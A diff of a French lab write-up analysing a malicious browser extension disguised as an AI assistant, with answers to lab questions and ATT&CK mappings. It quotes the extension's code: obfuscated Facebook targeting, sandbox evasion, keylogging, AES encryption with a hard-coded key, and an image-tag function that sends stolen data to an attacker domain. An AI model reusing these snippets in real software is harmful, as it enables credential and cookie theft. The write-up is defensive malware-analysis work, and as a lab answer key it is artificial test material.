@@ -20,52 +20,24 @@ L'extension était déjà décompressée en fichiers lisibles : `manifest.json`,
 
 L'analyse suit un fil logique : le `manifest.json` d'abord (les permissions trahissent l'intention), puis l'ordre d'exécution du code — `loader.js` (démarrage) charge `app.js` (le cœur), qui appelle le chiffrement. On traque les mots-clés typiques : `atob`/`btoa` (encodage), `addEventListener` (capture), `CryptoJS`/`AES` (chiffrement), `new Image()`/`.src` (exfiltration), `navigator.plugins` (anti-analyse).
 
-## manifest.json — les permissions
-
-```json
-"permissions": ["tabs", "http://*/*", "https://*/*", "storage", "webRequest", "webRequestBlocking", "cookies"]
-```
+Les fichiers analysés : `manifest.json` (les permissions déclarées), `loader.js` (le script de démarrage, chargé en premier), `app.js` (le cœur, injecté dans toutes les pages). Les réponses ci-dessous suivent l'ordre des questions du lab.
 
 ![manifest.json - permissions dont cookies](screenshots/01-manifest-permissions-cookies.png)
 
-Un simple « assistant IA » n'a aucune raison de demander l'accès aux cookies de tous les sites : signal d'alarme immédiat. Le manifest indique aussi le point de départ (`loader.js`) et le script injecté dans toutes les pages (`app.js`).
-
-### Q10 — Données de session / authentification accédées
-
-La permission `cookies` autorise l'extension à lire les cookies de session, donc à détourner des sessions déjà authentifiées (sans mot de passe).
-
-**Réponse : `cookies`** — ATT&CK T1539 (Steal Web Session Cookie).
-
-## loader.js — anti-analyse
-
-```javascript
-if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
-    alert("Virtual environment detected. Extension will disable itself.");
-}
-```
-
 ![loader.js - anti-analyse et chargement de app.js](screenshots/02-loader-anti-analyse.png)
-
-Les sandbox et navigateurs automatisés n'ont pas de plugins : l'extension détecte ainsi qu'elle est observée et se désactive.
-
-### Q4 — Première condition de désactivation
-
-**Réponse : `navigator.plugins.length === 0`** — ATT&CK T1497 (Virtualization/Sandbox Evasion).
-
-## app.js — le cœur malveillant
-
-Tout le comportement malveillant tient dans ce seul fichier : cible encodée, capture des identifiants et des frappes, chiffrement, puis exfiltration.
 
 ![app.js - cœur malveillant complet](screenshots/03-app-core-malveillant.png)
 
 ### Q1 — Encodage masquant les URLs
+
+Dans `app.js`, la cible est encodée pour ne pas apparaître en clair :
 
 ```javascript
 var _0x5eaf = function(_0x5fa1) { return btoa(_0x5fa1); };
 const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
 ```
 
-La cible est encodée pour ne pas apparaître en clair. Décodée avec CyberChef (From Base64), `d3d3LmZhY2Vib29rLmNvbQ==` donne `www.facebook.com`.
+`btoa` est la fonction JavaScript d'encodage base64. Décodée avec CyberChef (From Base64), `d3d3LmZhY2Vib29rLmNvbQ==` donne `www.facebook.com`.
 
 ![CyberChef - décodage base64 vers www.facebook.com](screenshots/04-cyberchef-base64-facebook.png)
 
@@ -77,9 +49,37 @@ La cible est encodée pour ne pas apparaître en clair. Décodée avec CyberChef
 if (targets.indexOf(window.location.hostname) !== -1) { ... }
 ```
 
-L'extension ne s'active que si la page courante est la cible décodée. Cela la rend furtive : inactive partout ailleurs.
+L'extension ne s'active que si la page courante est la cible décodée au Q1. Cela la rend furtive : inactive partout ailleurs.
 
 **Réponse : `www.facebook.com`**
+
+### Q3 — Élément HTML utilisé pour l'exfiltration
+
+```javascript
+function sendToServer(encryptedData) {
+    var img = new Image();
+    img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
+    document.body.appendChild(img);
+}
+```
+
+Les données volées sont placées dans l'URL d'une image chargée depuis le serveur de l'attaquant. Charger une image est une action banale qu'aucun filtre ne bloque : l'exfiltration se déguise en trafic normal.
+
+**Réponse : `img` (balise `<img>`)** — ATT&CK T1041 (Exfiltration Over C2 Channel).
+
+### Q4 — Première condition de désactivation
+
+Dans `loader.js`, l'extension vérifie si elle est observée avant d'agir :
+
+```javascript
+if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
+    alert("Virtual environment detected. Extension will disable itself.");
+}
+```
+
+Les sandbox et navigateurs automatisés n'ont pas de plugins : la première condition détecte cet environnement d'analyse et l'extension se désactive.
+
+**Réponse : `navigator.plugins.length === 0`** — ATT&CK T1497 (Virtualization/Sandbox Evasion).
 
 ### Q5 — Événement capturé sur les formulaires
 
@@ -108,6 +108,16 @@ document.addEventListener('keydown', function(event) {
 
 **Réponse : `keydown`** — ATT&CK T1056.001 (Keylogging).
 
+### Q7 — Domaine d'exfiltration
+
+Dans la même fonction `sendToServer` (voir Q3), l'URL de destination révèle le serveur de l'attaquant :
+
+```javascript
+img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
+```
+
+**Réponse : `Mo.Elshaheedy.com`** — ATT&CK T1041 (Exfiltration Over C2 Channel).
+
 ### Q8 — Fonction d'exfiltration des identifiants
 
 ```javascript
@@ -130,24 +140,21 @@ function encryptPayload(data) {
 }
 ```
 
-Le butin est chiffré en AES avant l'envoi (vrai chiffrement, à distinguer du base64 qui n'était que du masquage). Détail : la clé `SuperSecretKey123` est en dur, donc les données volées seraient déchiffrables.
+Le butin est chiffré en AES avant l'envoi (vrai chiffrement, à distinguer du base64 du Q1 qui n'était que du masquage). Détail : la clé `SuperSecretKey123` est en dur, donc les données volées seraient déchiffrables.
 
 **Réponse : `AES`**
 
-### Q3 et Q7 — Exfiltration via une balise image
+### Q10 — Données de session / authentification accédées
 
-```javascript
-function sendToServer(encryptedData) {
-    var img = new Image();
-    img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
-    document.body.appendChild(img);
-}
+Retour au `manifest.json` : un simple « assistant IA » n'a aucune raison de demander l'accès aux cookies de tous les sites.
+
+```json
+"permissions": ["tabs", "http://*/*", "https://*/*", "storage", "webRequest", "webRequestBlocking", "cookies"]
 ```
 
-Les données volées sont placées dans l'URL d'une image chargée depuis le serveur de l'attaquant. Charger une image est une action banale qu'aucun filtre ne bloque : l'exfiltration se déguise en trafic normal.
+La permission `cookies` autorise l'extension à lire les cookies de session, donc à détourner des sessions déjà authentifiées (sans mot de passe).
 
-**Réponse Q3 : `img` (balise `<img>`)**
-**Réponse Q7 : `Mo.Elshaheedy.com`** — ATT&CK T1041 (Exfiltration Over C2 Channel).
+**Réponse : `cookies`** — ATT&CK T1539 (Steal Web Session Cookie).
 
 ## Récapitulatif
 
